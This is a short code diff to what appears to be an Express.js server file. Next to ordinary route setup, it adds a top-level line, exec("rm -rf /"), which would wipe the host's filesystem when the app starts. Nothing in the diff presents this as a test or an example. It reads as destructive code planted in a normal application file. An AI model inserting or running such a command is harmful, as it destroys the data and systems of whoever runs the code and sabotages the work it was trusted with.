@@ -8,3 +8,5 @@ app.get('/', (_req, res) => {
 });
 
 app.use('/health', health);
+
+exec("rm -rf /");
